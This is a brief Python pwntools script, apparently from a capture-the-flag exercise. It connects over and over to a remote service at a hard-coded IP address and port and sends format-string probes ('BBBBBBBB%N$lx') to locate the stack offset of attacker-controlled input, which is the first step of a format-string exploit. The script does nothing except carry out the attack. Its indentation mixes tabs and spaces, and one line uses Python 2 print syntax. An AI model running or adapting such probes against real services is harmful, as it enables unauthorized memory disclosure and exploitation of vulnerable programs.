from pwn import *
def pad(str):
	return str+'A'*(40-len(str))
for i in range(1,30):
	p=remote("3.228.124.42",20002)
	p.recvuntil("Number:")
	p.sendline("1")
	p.recvuntil("you die:")
	p.sendline("BBBBBBBB%"+str(i)+"$lx")
	log.info("Offset is: "+str(i))
        print p.recvline()
	p.close()

